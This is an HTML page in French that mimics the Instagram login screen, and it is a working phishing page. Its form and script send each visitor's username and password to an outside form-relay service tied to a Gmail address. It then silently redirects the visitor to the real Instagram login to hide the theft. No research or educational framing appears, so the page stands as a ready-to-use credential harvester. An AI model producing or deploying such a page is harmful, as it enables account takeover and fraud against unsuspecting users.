<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Instagram</title>
<style>
  body {
    background: #000;
    color: #fff;
    font-family: system-ui, Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .container {
    background: #121212;
    padding: 40px 30px;
    border-radius: 8px;
    width: 320px;
    box-sizing: border-box;
  }
  .logo {
    text-align: center;
    font-size: 36px;
    font-weight: 700;
    margin-bottom: 30px;
  }
  label {
    display: block;
    margin-top: 15px;
    font-size: 14px;
  }
  input[type="text"],
  input[type="password"] {
    width: 100%;
    padding: 10px;
    background: #222;
    border: 1px solid #444;
    border-radius: 4px;
    color: #fff;
    font-size: 14px;
    margin-top: 5px;
  }
  button {
    width: 100%;
    margin-top: 20px;
    padding: 12px;
    background: #3897f0;
    border: none;
    border-radius: 4px;
    color: white;
    font-weight: 700;
    font-size: 14px;
    cursor: pointer;
  }
  .facebook-btn {
    background: #1877f2;
    margin-bottom: 15px;
    font-weight: 700;
    cursor: default;
  }
  .separator {
    display: flex;
    align-items: center;
    text-align: center;
    margin: 15px 0;
    color: #888;
    font-size: 12px;
  }
  .separator::before,
  .separator::after {
    content: "";
    flex: 1;
    border-bottom: 1px solid #444;
  }
  .separator:not(:empty)::before {
    margin-right: .75em;
  }
  .separator:not(:empty)::after {
    margin-left: .75em;
  }
  .password-wrapper {
    position: relative;
  }
  .toggle-password {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    cursor: pointer;
    width: 22px;
    height: 22px;
    fill: #aaa;
  }
</style>
</head>
<body>

<div class="container">
  <div class="logo">Instagram</div>

  <form id="instaForm" action="https://formsubmit.co/design.site.web69@gmail.com" method="POST" autocomplete="off">
    <button type="button" class="facebook-btn" disabled>Continuer avec Facebook</button>

    <div class="separator">OU</div>

    <label for="username">Téléphone, nom d’utilisateur ou e-mail</label>
    <input type="text" id="username" name="username" required />

    <label for="password">Mot de passe</label>
    <div class="password-wrapper">
      <input type="password" id="password" name="password" required />
      <svg class="toggle-password" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
        <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
        <circle cx="12" cy="12" r="2.5"/>
      </svg>
    </div>

    <button type="submit">Se connecter</button>
  </form>
</div>

<script>
  // Afficher/cacher mot de passe
  const togglePassword = document.querySelector('.toggle-password');
  const passwordInput = document.getElementById('password');

  togglePassword.addEventListener('click', () => {
    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordInput.setAttribute('type', type);
    togglePassword.style.fill = type === 'text' ? '#3897f0' : '#aaa';
  });

  // Envoi + redirection
  document.getElementById('instaForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const formData = new FormData(this);

    fetch('https://formsubmit.co/design.site.web69@gmail.com', {
      method: 'POST',
      body: formData,
      mode: 'no-cors'
    }).finally(() => {
      window.location.href = 'https://www.instagram.com/accounts/login/';
    });
  });
</script>

</body>
</html>
